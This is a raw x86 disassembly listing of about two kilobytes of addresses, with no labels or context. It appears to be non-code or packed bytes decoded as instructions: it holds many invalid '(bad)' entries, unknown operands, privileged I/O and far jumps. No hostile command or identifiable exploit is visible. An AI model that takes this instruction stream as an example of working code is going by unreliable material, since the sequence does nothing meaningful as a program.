  42048d:	cmp    dl,ah
  42048f:	dec    esi
  420490:	xlat   BYTE PTR ds:[ebx]
  420491:	inc    ebx
  420492:	push   edx
  420493:	lods   al,BYTE PTR ds:[esi]
  420494:	mov    bl,0xaf
  420496:	jge    0x4204a4
  420498:	adc    DWORD PTR [edi],esi
  42049a:	xor    ch,BYTE PTR [ebx*1+0x387b747e]
  4204a1:	pop    edi
  4204a2:	sub    ecx,DWORD PTR [edi+ebp*1-0x20]
  4204a6:	rcr    bl,1
  4204a8:	test   al,0xa4
  4204aa:	mov    ah,0x3b
  4204ac:	out    0xa1,eax
  4204ae:	aad    0xe2
  4204b0:	repnz sbb BYTE PTR [eax+0x68],dh
  4204b4:	retf   0x7629
  4204b7:	push   ebp
  4204b8:	inc    edi
  4204b9:	repnz iret 
  4204bb:	push   esp
  4204bc:	bound  esp,QWORD PTR ds:0xfd999d3d
  4204c2:	popf   
  4204c3:	push   ss
  4204c4:	mov    ebp,0x43c2f421
  4204c9:	mov    esi,0x63da33a2
  4204ce:	aaa    
  4204cf:	cdq    
  4204d0:	jp     0x4204c3
  4204d2:	inc    ecx
  4204d3:	popa   
  4204d4:	xor    eax,DWORD PTR ds:0x3cd71877
  4204da:	jle    0x4204be
  4204dc:	jp     0x42052a
  4204de:	icebp  
  4204df:	iret   
  4204e0:	imul   eax,ecx,0x31
  4204e3:	adc    al,0x50
  4204e5:	test   al,0x7c
  4204e7:	aas    
  4204e8:	cmp    al,0x36
  4204ea:	inc    esi
  4204eb:	stos   BYTE PTR es:[edi],al
  4204ec:	inc    ebp
  4204ed:	jno    0x4204d1
  4204ef:	and    eax,0x2744cdc7
  4204f4:	es mov bl,0x51
  4204f7:	mov    edi,0x377a30a5
  4204fc:	mov    ch,0x8d
  4204fe:	lahf   
  4204ff:	sar    DWORD PTR [eax],1
  420501:	int    0x9e
  420503:	mov    es,WORD PTR [eax]
  420505:	call   0x9ec0:0x50057074
  42050c:	out    dx,eax
  42050d:	cmc    
  42050e:	cmp    eax,DWORD PTR [edi-0x533ab344]
  420514:	push   edx
  420515:	push   cs
  420516:	xchg   BYTE PTR ss:[edx],bl
  420519:	cld    
  42051a:	je     0x42057d
  42051c:	out    dx,eax
  42051d:	add    dh,al
  42051f:	mov    ebp,0x77ee65e6
  420524:	sbb    ebx,0xffffffdd
  420527:	add    edi,DWORD PTR [ecx-0x4b]
  42052a:	pop    edi
  42052b:	das    
  42052c:	jecxz  0x4204e8
  42052e:	jnp    0x4205ac
  420530:	inc    ebp
  420531:	add    ecx,DWORD PTR [eax+eiz*2+0x2f]
  420535:	pop    eax
  420536:	dec    eax
  420537:	test   eax,0xde548e91
  42053c:	and    al,0x6d
  42053e:	std    
  42053f:	outs   dx,BYTE PTR ds:[si]
  420541:	xchg   ebp,eax
  420542:	repnz fcomi st,st(6)
  420545:	add    al,0x2f
  420547:	leave  
  420548:	sbb    al,BYTE PTR [esi+0x3e]
  42054b:	mov    cs,WORD PTR [ebp-0x79]
  42054e:	in     eax,dx
  42054f:	xchg   esi,eax
  420550:	dec    edi
  420551:	(bad)  
  420553:	scas   eax,DWORD PTR es:[edi]
  420554:	ds enter 0x9d57,0x3e
  420559:	popa   
  42055a:	push   esp
  42055b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42055c:	(bad)  
  42055e:	sbb    al,0x32
  420560:	pop    ecx
  420561:	(bad)  
  420562:	jns    0x4205dc
  420564:	in     eax,0x86
  420566:	imul   esp,DWORD PTR [ecx-0x78],0xffffffd7
  42056a:	mov    eax,ds:0x7e57116d
  42056f:	and    eax,0xe41718ca
  420574:	add    dh,BYTE PTR [esi-0x74f1925f]
  42057a:	jo     0x4205fb
  42057c:	sbb    dl,cl
  42057e:	cmc    
  42057f:	sbb    bh,0x7d
  420582:	addr16 pop esi
  420584:	ins    DWORD PTR es:[edi],dx
  420585:	sbb    DWORD PTR [edx+0x107b9b85],ebx
  42058b:	xchg   ebp,eax
  42058c:	sbb    eax,0x6728ea7a
  420591:	and    ebx,ecx
  420593:	enter  0xc686,0x66
  420597:	cdq    
  420598:	jae    0x4205a8
  42059a:	ret    
  42059b:	push   ds
  42059c:	and    BYTE PTR [ebp-0x65898bc9],0xad
  4205a3:	or     DWORD PTR [eax+0x69],0xa68db68d
  4205aa:	xor    dl,dl
  4205ac:	pop    esp
  4205ad:	enter  0xb8f4,0x4c
  4205b1:	and    al,0xcf
  4205b3:	out    dx,al
  4205b4:	adc    ecx,ebx
  4205b6:	cld    
  4205b7:	stos   DWORD PTR es:[edi],eax
  4205b8:	sub    al,0x17
  4205ba:	leave  
  4205bb:	push   ebp
  4205bc:	in     eax,0xec
  4205be:	fnstenv [eax-0x618d78a0]
  4205c4:	fstp   TBYTE PTR [esi-0x792f1274]
  4205ca:	fild   WORD PTR [ebx+0x78]
  4205cd:	inc    ebp
  4205ce:	loopne 0x420642
  4205d0:	xlat   BYTE PTR ds:[ebx]
  4205d1:	sahf   
  4205d2:	fidiv  DWORD PTR [edx-0xef6bcff]
  4205d8:	data16 add al,0xde
  4205db:	out    dx,eax
  4205dc:	xchg   edx,eax
  4205dd:	xlat   BYTE PTR ds:[ebx]
  4205de:	arpl   WORD PTR [eax],cx
  4205e0:	ins    DWORD PTR es:[edi],dx
  4205e1:	fmulp  st(2),st
  4205e3:	retf   0x255a
  4205e6:	imul   ebx,DWORD PTR [edi+0x1a],0x5e859bf0
  4205ed:	cmp    al,dl
  4205ef:	jmp    0x420655
  4205f1:	test   BYTE PTR [ecx+0x26],bl
  4205f4:	or     cl,dh
  4205f6:	(bad)  
  4205f7:	pusha  
  4205f8:	test   BYTE PTR [edi],bh
  4205fa:	dec    edi
  4205fb:	xor    DWORD PTR [ecx+0x1c2d7157],ebx
  420601:	mov    edx,?
  420603:	sub    eax,DWORD PTR [ebx+ebp*2+0x55]
  420607:	mov    cl,0xbe
  420609:	sbb    BYTE PTR [edi],dl
  42060b:	lods   al,BYTE PTR ds:[esi]
  42060c:	pusha  
  42060d:	lock jbe 0x4205ca
  420610:	jmp    0x4205f5
  420612:	je     0x42062e
  420614:	hlt    
  420615:	loopne 0x4205d4
  420617:	jl     0x42065e
  420619:	jge    0x420623
  42061b:	pop    ss
  42061c:	repz ret 
  42061e:	mov    dh,0x58
  420620:	jecxz  0x42065c
  420622:	ss clc 
  420624:	(bad)  
  420625:	imul   esp,DWORD PTR [ecx+0x424f17d8],0xffffff87
  42062c:	xchg   ecx,eax
  42062d:	dec    esp
  42062e:	pop    eax
  42062f:	xchg   esi,eax
  420630:	test   DWORD PTR [eax+0x7],ebx
  420633:	jb     0x420637
  420635:	push   ebp
  420636:	loop   0x42061f
  420638:	or     al,0x9d
  42063a:	lahf   
  42063b:	pop    ecx
  42063c:	sbb    DWORD PTR [ecx-0x79e353fd],esp
  420642:	mov    edx,0x856e3808
  420647:	xchg   edi,eax
  420648:	(bad)  
  420649:	fcmove st,st(7)
  42064b:	sbb    al,BYTE PTR [eax+0x54738c1f]
  420651:	inc    eax
  420652:	mov    dh,0x45
  420654:	mov    al,ds:0x12d38b6e
  420659:	jb     0x4206a2
  42065b:	adc    BYTE PTR [ecx-0x1553c938],dl
  420661:	daa    
  420662:	sub    DWORD PTR [ecx-0x5d90f942],esi
  420668:	(bad)  
  420669:	jb     0x4206cc
  42066b:	std    
  42066c:	(bad)
  420670:	lods   eax,DWORD PTR ds:[esi]
  420671:	dec    ebx
  420672:	scas   al,BYTE PTR es:[edi]
  420673:	mov    ebp,0x927b7d45
  420678:	mov    ?,WORD PTR [ecx]
  42067a:	jb     0x420610
  42067c:	or     cl,ah
  42067e:	xor    BYTE PTR [esi-0x58fa2559],0xb8
  420685:	sub    al,0x35
  420687:	pop    esi
  420688:	jo     0x420641
  42068a:	fstp   DWORD PTR ds:0x36b80dc
  420690:	mov    bh,0xae
  420692:	xor    al,0x56
  420694:	and    bl,ah
  420696:	adc    DWORD PTR [esi+eiz*2],esi
  420699:	push   esi
  42069a:	xor    al,0x14
  42069c:	sar    esp,cl
  42069e:	movs   BYTE PTR es:[edi],BYTE PTR cs:[esi]
  4206a0:	cs mov ?,ebx
  4206a3:	add    BYTE PTR [esi+0x164ddc8b],bl
  4206a9:	(bad)  
  4206aa:	sbb    DWORD PTR [ebx+0x503fcfe2],ebx
  4206b0:	adc    eax,0xbb93ad8c
  4206b5:	retf   0xd4ee
  4206b8:	jnp    0x42067c
  4206ba:	mov    ch,0x16
  4206bc:	inc    edx
  4206bd:	or     al,0xcd
  4206bf:	sbb    DWORD PTR [ebx],esi
  4206c1:	and    BYTE PTR [esi],ah
  4206c3:	cmc    
  4206c4:	inc    edx
  4206c5:	pusha  
  4206c6:	cwde   
  4206c7:	inc    BYTE PTR [eax-0x40a1b361]
  4206cd:	push   ebp
  4206ce:	sub    al,ah
  4206d0:	imul   ecx,ebx,0xffffffa2
  4206d3:	aam    0xf0
  4206d5:	inc    ecx
  4206d6:	sbb    eax,0xb77be673
  4206db:	fcomp  QWORD PTR [edx+0x59]
  4206de:	and    ah,BYTE PTR [ecx+edi*8]
  4206e1:	int3   
  4206e2:	outs   dx,BYTE PTR ds:[esi]
  4206e3:	(bad)  
  4206e4:	xchg   ebp,eax
  4206e5:	int    0x61
  4206e7:	inc    edi
  4206e8:	lahf   
  4206e9:	jg     0x4206d0
  4206eb:	inc    eax
  4206ec:	scas   al,BYTE PTR es:[edi]
  4206ed:	test   eax,0xf14098c8
  4206f2:	xchg   ebx,eax
  4206f3:	mov    es,WORD PTR [edx-0x6f6f74b9]
  4206f9:	adc    ch,BYTE PTR [ebx+0xe]
  4206fc:	js     0x42069c
  4206fe:	dec    esi
  4206ff:	xchg   edi,eax
  420700:	cmp    edi,DWORD PTR gs:[edx-0x1237a8f1]
  420707:	mov    esi,0x91180d3e
  42070c:	fisub  DWORD PTR [edx+0xf]
  42070f:	out    0x64,al
  420711:	sbb    eax,0x4577f097
  420716:	sbb    eax,0x45985f5c
  42071b:	mov    esp,0xe7dfdc6a
  420720:	pop    ebx
  420721:	in     al,0xb5
  420723:	fwait
  420724:	sbb    BYTE PTR [edi-0x5],al
  420727:	add    al,0x51
  420729:	push   es
  42072a:	push   0x2d5383a4
  42072f:	loopne 0x4206b1
  420731:	bound  ebx,QWORD PTR [edi-0x60]
  420734:	ins    DWORD PTR es:[edi],dx
  420735:	into   
  420736:	call   FWORD PTR [edx+0x7e]
  420739:	pusha  
  42073a:	xor    BYTE PTR [edx],al
  42073c:	mov    BYTE PTR [eax],ch
  42073e:	jae    0x42075c
  420740:	std    
  420741:	xor    DWORD PTR [edi],edi
  420743:	sub    dh,BYTE PTR [ebx+0x42]
  420746:	sub    bh,BYTE PTR [esi-0x3c]
  420749:	xchg   ecx,eax
  42074a:	jl     0x4207b7
  42074c:	in     eax,0x74
  42074e:	call   FWORD PTR [edi-0x196c9d08]
  420754:	inc    edi
  420755:	mov    bh,BYTE PTR [eax+eiz*1-0x434f16dd]
  42075c:	call   0x8a8fc525
  420761:	jg     0x42079d
  420763:	push   ebp
  420764:	cmp    eax,0xd1e64ea4
  420769:	test   eax,0x6b1d5edb
  42076e:	xchg   ecx,eax
  42076f:	(bad)  
  420770:	cmp    BYTE PTR [eax-0x7d9648e9],ch
  420776:	aaa    
  420777:	rcl    BYTE PTR [edx-0xb45f4c6],cl
  42077d:	out    dx,al
  42077e:	in     al,0xdd
  420780:	adc    BYTE PTR ds:0x1b0aeeae,bh
  420786:	call   0x4b465730
  42078b:	pop    es
  42078c:	inc    esp
  42078d:	xchg   edx,eax
  42078e:	addr16 inc ecx
  420790:	enter  0xd499,0xd9
  420794:	sub    al,0x9
  420796:	push   ebp
  420797:	jno    0x4207cf
  420799:	xchg   ecx,eax
  42079a:	das    
  42079b:	dec    ebp
  42079c:	mul    BYTE PTR [edi-0x12d566d4]
  4207a2:	pop    eax
  4207a3:	out    0xba,al
  4207a5:	and    ebp,edi
  4207a7:	xchg   ecx,eax
  4207a8:	popa   
  4207a9:	jns    0x420813
  4207ab:	shl    DWORD PTR [ebx],cl
  4207ad:	jp     0x42073b
  4207af:	mul    BYTE PTR [ecx]
  4207b1:	adc    DWORD PTR [eax-0x2d],ebp
  4207b4:	ins    BYTE PTR es:[edi],dx
  4207b5:	mov    ds:0x4c886504,al
  4207ba:	mov    WORD PTR [ecx+0x65ae634d],es
  4207c0:	sub    edx,0xbabf65b4
  4207c6:	jb     0x42077a
  4207c8:	(bad)  
  4207c9:	dec    edx
  4207ca:	adc    al,bh
  4207cc:	leave  
  4207cd:	xchg   edx,eax
  4207ce:	and    ah,BYTE PTR [esi]
  4207d0:	fild   DWORD PTR [esi+0x6d]
  4207d3:	mov    al,0x9e
  4207d5:	mov    cl,0xa8
  4207d7:	jne    0x42084b
  4207d9:	mov    edx,0xd431e2ef
  4207de:	xchg   edi,eax
  4207df:	and    al,0xc4
  4207e1:	inc    esp
  4207e2:	pop    edx
  4207e3:	sub    eax,0x61507d40
  4207e8:	in     al,dx
  4207e9:	pop    ss
  4207ea:	mov    dl,0x7f
  4207ec:	or     eax,DWORD PTR [esi]
  4207ee:	push   esi
  4207ef:	xchg   ecx,eax
  4207f0:	(bad)  
  4207f1:	imul   DWORD PTR [ebx-0x5a]
  4207f4:	push   esp
  4207f5:	or     cl,BYTE PTR [edi+0x54]
  4207f8:	dec    edi
  4207f9:	pop    es
  4207fa:	dec    eax
  4207fb:	push   ebp
  4207fc:	and    eax,0xd799f5d4
  420801:	push   ecx
  420802:	es inc eax
  420804:	inc    edx
  420805:	cmp    al,0xa3
  420807:	ss test al,0x99
  42080a:	mov    edx,0xa528158b
  42080f:	sub    edx,DWORD PTR [ecx+0x1e]
  420812:	(bad)  
  420813:	jnp    0x42080a
  420815:	push   0x20b5ca3b
  42081a:	popa   
  42081b:	add    ebp,DWORD PTR [edi+0x1c]
  42081e:	into   
  42081f:	and    al,0x4a
  420821:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420822:	inc    ecx
  420823:	loop   0x4207b8
  420825:	stc    
  420826:	shl    BYTE PTR [ebx+0x58238d35],1
  42082c:	inc    dh
  42082e:	shr    DWORD PTR [edx+0xd],0xdd
  420832:	and    BYTE PTR ds:[eax+0x75b81a9],dh
  420839:	inc    eax
  42083a:	sub    BYTE PTR [ebp+0x73],ah
  42083d:	fisttp QWORD PTR [esi+0x6f]
  420840:	add    al,0xa6
  420842:	stos   DWORD PTR es:[edi],eax
  420843:	shl    DWORD PTR [ecx-0x15],cl
  420846:	lahf   
  420847:	xchg   ebp,eax
  420848:	fistp  WORD PTR [esi-0x2e97518c]
  42084e:	add    dh,bh
  420850:	stc    
  420851:	test   DWORD PTR [eax+0x1f],0xf073c32b
  420858:	call   0x56e204c5
  42085d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42085e:	mov    WORD PTR [ecx+0x4b95de91],?
  420864:	and    DWORD PTR [eax-0x7b],ebx
  420867:	popa   
  420868:	xchg   DWORD PTR [eax-0x4a],edx
  42086b:	pop    es
  42086c:	imul   esp,DWORD PTR [ecx+0x277d2135],0xd65adce6
  420876:	fs xchg edx,eax
  420878:	mov    ch,0x36
  42087a:	sbb    BYTE PTR [eax],dh
  42087c:	rcr    ebp,1
  42087e:	xchg   ebx,eax
  42087f:	mov    eax,0xdd81b21f
  420884:	pop    ebp
  420885:	retf   
  420886:	in     al,0xb8
  420888:	clc    
  420889:	(bad)  
  42088a:	pop    edi
  42088b:	mov    edx,0xcdd3a369
  420890:	ret    0x3f44
  420893:	pop    edi
  420894:	mov    DWORD PTR [ecx],ebx
  420896:	ins    DWORD PTR es:[edi],dx
  420897:	mov    ds:0x95831a8c,al
  42089c:	or     ah,BYTE PTR [edx]
  42089e:	lea    ebx,[ecx+eax*1]
  4208a1:	popa   
  4208a2:	lds    eax,FWORD PTR es:[ecx-0x13]
  4208a6:	mov    eax,0x6bbfc54a
  4208ab:	adc    BYTE PTR [esi-0x7d],cl
  4208ae:	popa   
  4208af:	sbb    DWORD PTR [ecx-0x406e1aa1],esp
  4208b5:	mov    eax,ds:0x8e73cdae
  4208ba:	dec    eax
  4208bb:	dec    esp
  4208bc:	not    BYTE PTR cs:[edi-0x2653e7b0]
  4208c3:	retf   0xdf3b
  4208c6:	adc    eax,0x1f0511be
  4208cb:	sbb    bl,BYTE PTR [edi]
  4208cd:	jae    0x4208bf
  4208cf:	je     0x420947
  4208d1:	or     eax,DWORD PTR [ebp-0x3606e64f]
  4208d7:	daa    
  4208d8:	cmp    ch,BYTE PTR [esi-0x694e86a3]
  4208de:	push   ebx
  4208df:	mov    eax,0xc000e9f0
  4208e4:	inc    ebx
  4208e5:	gs sti 
  4208e7:	sbb    bh,BYTE PTR [edi]
  4208e9:	cmp    al,0x9e
  4208eb:	sti    
  4208ec:	cmp    esp,edx
  4208ee:	aaa    
  4208ef:	aad    0xe5
  4208f1:	std    
  4208f2:	es (bad) 
  4208f4:	adc    eax,0x42822f9e
  4208f9:	pop    ebx
  4208fa:	mov    ah,al
  4208fc:	jb     0x4208b0
  4208fe:	lods   al,BYTE PTR ds:[esi]
  4208ff:	mov    cl,0x4a
  420901:	sub    eax,0x5712cf94
  420906:	jmp    0x7759de7e
  42090b:	push   cs
  42090c:	aas    
  42090d:	stos   BYTE PTR es:[edi],al
  42090e:	or     eax,0x7a730f3d
  420913:	pop    edx
  420914:	jb     0x42090c
  420916:	je     0x420966
  420918:	pop    ebx
  420919:	jmp    0x420988
  42091b:	cmp    eax,0xb8967a42
  420920:	fisttp QWORD PTR [esp+ecx*2+0x43]
  420924:	pushf  
  420925:	fninit 
  420927:	and    edi,esp
  420929:	daa    
  42092a:	(bad)  ds:0xcfa05de2
  420930:	sti    
  420931:	cs ja  0x4208dd
  420934:	jae    0x420928
  420936:	loop   0x4208bf
  420938:	stos   DWORD PTR es:[edi],eax
  420939:	dec    ecx
  42093a:	xchg   edi,eax
  42093b:	cmp    dh,BYTE PTR [ebx]
  42093d:	repnz cmp ebp,esp
  420940:	or     DWORD PTR [ebx+eax*4+0x65dc44ad],eax
  420947:	inc    ebp
  420948:	inc    esi
  420949:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42094a:	sub    eax,0x6c29a42c
  42094f:	hlt    
  420950:	add    DWORD PTR [eax-0x7e3edb70],esp
  420956:	popf   
  420957:	fild   WORD PTR [ecx+0x2cca5d9c]
  42095d:	int3   
  42095e:	mov    ds:0xc97559f,eax
  420963:	push   esi
  420964:	dec    esi
  420965:	std    
  420966:	dec    eax
  420967:	adc    al,0xb8
  420969:	dec    ecx
  42096a:	test   eax,0xafc135aa
  42096f:	push   ebp
  420970:	test   al,0xe3
  420972:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420973:	push   0xb
  420975:	adc    DWORD PTR [edx],ecx
  420977:	xor    eax,0x29b2ffd0
  42097c:	xor    esp,esp
  42097e:	mov    dl,0x4c
  420980:	pop    ebx
  420981:	sbb    DWORD PTR [ebx-0x6],ebp
  420984:	adc    DWORD PTR [esi+0x73820e40],esp
  42098a:	dec    ebp
  42098b:	adc    ah,BYTE PTR [ebx+0x63c2e406]
  420991:	or     edi,edx
  420993:	mov    bh,0x4f
  420995:	clc    
  420996:	xchg   ebx,eax
  420997:	xchg   ecx,eax
  420998:	call   0x395d:0x5e4f79c6
  42099f:	mov    bl,0xf7
  4209a1:	cmp    al,0x38
  4209a3:	or     DWORD PTR [edx-0x11],ecx
  4209a6:	icebp  
  4209a7:	mov    edi,DWORD PTR [ecx-0x11]
  4209aa:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4209ab:	shl    BYTE PTR [esi-0x6a5fc9b7],1
  4209b1:	xchg   ebp,eax
  4209b2:	ja     0x42097c
  4209b4:	sub    BYTE PTR [ebx],0x67
  4209b7:	xchg   edi,eax
  4209b8:	(bad)  
  4209b9:	sub    ch,BYTE PTR [edi]
  4209bb:	sub    BYTE PTR [edi],al
  4209bd:	xchg   ch,ch
  4209bf:	sub    BYTE PTR [ecx],cl
  4209c1:	(bad)  
  4209c2:	shr    BYTE PTR [edx+0x286b3144],1
  4209c8:	ja     0x420a16
  4209ca:	stc    
  4209cb:	mov    eax,ds:0x23fd3cd8
  4209d0:	in     eax,dx
  4209d1:	push   0xffffff85
  4209d3:	retf   
  4209d4:	stc    
  4209d5:	mov    dl,0x7a
  4209d7:	scas   al,BYTE PTR es:[edi]
  4209d8:	xor    DWORD PTR [ebx+edx*4+0x2195b55b],edi
  4209df:	jne    0x4209c7
  4209e1:	mov    bl,0x1f
  4209e3:	mov    bh,0x40
  4209e5:	mov    cl,0xe8
  4209e7:	cmc    
  4209e8:	or     BYTE PTR [ecx],ah
  4209ea:	imul   eax,DWORD PTR [ebx],0xffffffae
  4209ed:	fadd   DWORD PTR [ecx-0x75]
  4209f0:	adc    esi,0x61a456d8
  4209f6:	icebp  
  4209f7:	jmp    0xa25f:0x88623046
  4209fe:	ret    
  4209ff:	add    edi,esi
  420a01:	inc    edi
  420a02:	dec    edx
  420a03:	jbe    0x4209de
  420a05:	mov    eax,0x2c04cf89
  420a0a:	sbb    dh,al
  420a0c:	fnsave [edi+esi*8+0x71618fc5]
  420a13:	rcr    DWORD PTR [esi],1
  420a15:	push   0xffffff81
  420a17:	dec    edx
  420a18:	(bad)  
  420a19:	jecxz  0x420a8e
  420a1b:	loope  0x420a6b
  420a1d:	inc    edx
  420a1e:	pop    DWORD PTR [esi+0x6adda621]
  420a24:	push   edi
  420a25:	jle    0x4209d7
  420a27:	and    bh,BYTE PTR [eax-0x18]
  420a2a:	into   
  420a2b:	add    BYTE PTR [ebx+ebp*2+0x3f0e4257],ah
  420a32:	imul   DWORD PTR [eax-0x72c2e86]
  420a38:	mov    eax,ds:0x56d5263e
  420a3d:	push   es
  420a3e:	fcomp  QWORD PTR [eax+edi*8]
  420a41:	mov    al,0x92
  420a43:	and    BYTE PTR [ebp+0x1056405a],ch
  420a49:	int3   
  420a4a:	xchg   edi,eax
  420a4b:	mov    ebx,0x8f57bfc4
  420a50:	neg    BYTE PTR [esi]
  420a52:	or     eax,0x5c0d4b57
  420a57:	dec    esi
  420a58:	push   cs
  420a59:	shl    bl,1
  420a5b:	aad    0xfc
  420a5d:	retf   0x79db
  420a60:	addr16 xchg edi,eax
  420a62:	xchg   esi,eax
  420a63:	dec    edx
  420a64:	aam    0x42
  420a66:	outs   dx,DWORD PTR ds:[esi]
  420a67:	jae    0x420a84
  420a69:	sti    
  420a6a:	inc    ebp
  420a6b:	add    BYTE PTR [ecx],0xff
  420a6e:	sub    bh,BYTE PTR [ebx+edx*4+0x403100e7]
  420a75:	call   0xb0f7:0x5d3f2a52
  420a7c:	adc    eax,0x9f15af6c
  420a81:	rcr    DWORD PTR [edi+0x72790c1b],1
  420a87:	sbb    BYTE PTR [edi],ah
  420a89:	cmc    
  420a8a:	fstp   st(4)
  420a8c:	jo     0x420a71
  420a8e:	push   es
  420a8f:	(bad)  
  420a90:	jmp    0x420ac5
  420a92:	pop    esi
  420a93:	xor    al,0x79
  420a95:	mov    ebp,0x1dbaabdb
  420a9a:	push   edx
  420a9b:	pop    ds
  420a9c:	cmp    eax,0x3c8fd183
  420aa1:	imul   ecx,esp,0x2f
  420aa4:	fidivr DWORD PTR [eax]
  420aa6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420aa7:	jmp    0xf872:0xb5c9ee94
  420aae:	xchg   edx,eax
  420aaf:	push   ss
  420ab0:	ins    BYTE PTR es:[edi],dx
  420ab1:	gs cdq 
  420ab3:	jmp    0x420b33
  420ab5:	xor    ah,al
  420ab7:	xor    al,0x72
  420ab9:	sbb    eax,0xe6026af
  420abe:	adc    al,0xc5
  420ac0:	or     esp,DWORD PTR [esi]
  420ac2:	enter  0x2a2e,0xe7
  420ac6:	das    
  420ac7:	pop    ds
  420ac8:	ret    
  420ac9:	ror    BYTE PTR [ecx+0x919ebda],1
  420acf:	sbb    ecx,ebp
  420ad1:	add    edx,DWORD PTR [eax-0x6250e93]
  420ad7:	push   0x88cec8f0
  420adc:	icebp  
  420add:	xor    DWORD PTR [edx],ebp
  420adf:	scas   eax,DWORD PTR es:[edi]
  420ae0:	leave  
  420ae1:	pop    edx
  420ae2:	dec    esp
  420ae3:	push   es
  420ae4:	out    dx,al
  420ae5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420ae6:	pop    esi
  420ae7:	xor    eax,edx
  420ae9:	dec    esi
  420aea:	mov    ebp,0xe18e5731
  420aef:	add    DWORD PTR [ecx+0x200ba822],edx
  420af5:	sbb    BYTE PTR [eax-0x1c],ch
  420af8:	dec    esi
  420af9:	retf   0x7ceb
  420afc:	scas   eax,DWORD PTR es:[edi]
  420afd:	dec    eax
  420afe:	outs   dx,BYTE PTR ds:[esi]
  420aff:	xchg   edx,eax
  420b00:	mov    eax,0xa2f4b087
  420b05:	jl     0x420aa3
  420b07:	mov    esp,0x218bfb93
  420b0c:	retf   
  420b0d:	stc    
  420b0e:	test   DWORD PTR [eax+ecx*4+0x424dd9d6],0x3b070a75
  420b19:	mov    esp,eax
  420b1b:	xor    BYTE PTR [eax+eax*2-0x67f5c0c4],cl
  420b22:	fwait
  420b23:	rcl    BYTE PTR [eax],cl
  420b25:	push   ebx
  420b26:	sub    bl,dl
  420b28:	(bad)  
  420b2a:	add    eax,0x19babdd
  420b2f:	out    0xfb,eax
  420b31:	enter  0x4aff,0x33
  420b35:	pop    ecx
  420b36:	cmp    dl,BYTE PTR [eax+ebx*4-0x76]
  420b3a:	pop    ss
  420b3b:	or     edx,DWORD PTR [esi+0x1e]
  420b3e:	enter  0x9a11,0x49
  420b42:	pop    ebx
  420b43:	xor    esi,DWORD PTR [edx+0x8]
  420b46:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420b47:	xchg   esi,eax
  420b48:	jge    0x420af5
  420b4a:	mov    ds:0x33715acc,eax
  420b4f:	xor    al,0xd4
  420b51:	mov    eax,0x786774e5
  420b56:	jmp    0x420b82
  420b58:	int    0xb1
  420b5a:	jp     0x420b4f
  420b5c:	dec    ebp
  420b5d:	sbb    DWORD PTR [edx-0x7e],edx
  420b60:	jmp    0x407f0503
  420b65:	mov    ecx,esp
  420b67:	iret   
  420b68:	sub    dh,0x3c
  420b6b:	pop    eax
  420b6c:	fiadd  WORD PTR [edi+esi*2+0x3f]
  420b70:	adc    eax,0x50ff7990
  420b75:	test   BYTE PTR [eax],cl
  420b77:	fwait
  420b78:	retf   0x7511
  420b7b:	or     eax,0xd73be0dc
  420b80:	jecxz  0x420bc2
  420b82:	loopne 0x420b44
  420b84:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420b85:	imul   esi,DWORD PTR [ebx-0x76ffe298],0x30f0259e
  420b8f:	sub    BYTE PTR [esi+eiz*1],ah
  420b92:	xchg   esp,eax
  420b93:	(bad)  
  420b94:	and    BYTE PTR [edx],ah
  420b96:	cmp    BYTE PTR [eax-0x63],ch
  420b99:	inc    esp
  420b9a:	sbb    esi,ecx
  420b9c:	cdq    
  420b9d:	ds lahf 
  420b9f:	dec    ebx
  420ba0:	ja     0x420b62
  420ba2:	fdivr  DWORD PTR [edx-0x3b3b9f40]
  420ba8:	aad    0xd4
  420baa:	js     0x420b75
  420bac:	ins    DWORD PTR es:[edi],dx
  420bad:	pushf  
  420bae:	jg     0x420bb0
  420bb0:	jbe    0x420b82
  420bb2:	repz fcom QWORD PTR [edx]
  420bb5:	in     eax,0x85
  420bb7:	cmp    edx,DWORD PTR [ebp+0x79]
  420bba:	or     BYTE PTR [esi-0x69],cl
  420bbd:	call   0x45c7:0xbdbcca3e
  420bc4:	push   es
  420bc5:	popf   
  420bc6:	jo     0x420b66
  420bc8:	xchg   esi,eax
  420bc9:	or     eax,0x6e62329f
  420bce:	gs inc esi
  420bd0:	gs (bad) 
  420bd2:	pop    ebp
  420bd3:	imul   ebx,edi,0x98b4d3aa
  420bd9:	sub    al,ah
  420bdb:	and    al,0x4a
  420bdd:	adc    DWORD PTR [ebp-0x7b],0x154d0df2
  420be4:	push   ebp
  420be5:	loop   0x420b6d
  420be7:	loope  0x420bb4
  420be9:	mov    esi,edi
  420beb:	test   ebp,edx
  420bed:	je     0x420c2e
  420bef:	mov    cl,0x97
  420bf1:	shl    esi,cl
  420bf3:	and    bh,BYTE PTR [ebx]
  420bf5:	retf   0x47f9
  420bf8:	gs and eax,0x4090f56b
  420bfe:	test   BYTE PTR [edx+ebp*2],dl
  420c01:	nop
  420c02:	imul   esi,DWORD PTR [edi],0x7177f98a
  420c08:	arpl   WORD PTR [esi-0x80],cx
  420c0b:	adc    ebx,eax
  420c0d:	or     DWORD PTR [eax-0x254cfb1b],ebp
  420c13:	scas   eax,DWORD PTR es:[edi]
  420c14:	xchg   eax,eax
  420c16:	out    0x31,al
  420c18:	mov    ch,0x8a
  420c1a:	mov    ebx,0xcdf6273f
  420c1f:	test   eax,0xe90705c8
  420c24:	mov    ch,0x1
  420c26:	adc    eax,0x53efbdf3
  420c2b:	mov    ebx,0xd3530c19
  420c30:	ins    BYTE PTR es:[edi],dx
  420c31:	sbb    al,0xbf
  420c33:	jns    0x420c2e
  420c35:	stos   BYTE PTR es:[edi],al
  420c36:	ds mov ebp,0xb7140a5b
  420c3c:	je     0x420c1c
  420c3e:	push   0x59cac2db
  420c43:	ret    
  420c44:	sub    BYTE PTR [edx],dl
  420c46:	outs   dx,DWORD PTR ds:[esi]
  420c47:	in     al,0xd0
  420c49:	xchg   DWORD PTR [esi+0xa],ebx
  420c4c:	outs   dx,DWORD PTR ds:[esi]
  420c4d:	add    eax,0x889103d6
  420c52:	hlt    
  420c53:	and    DWORD PTR [ebp+0x3c39f733],0x1a
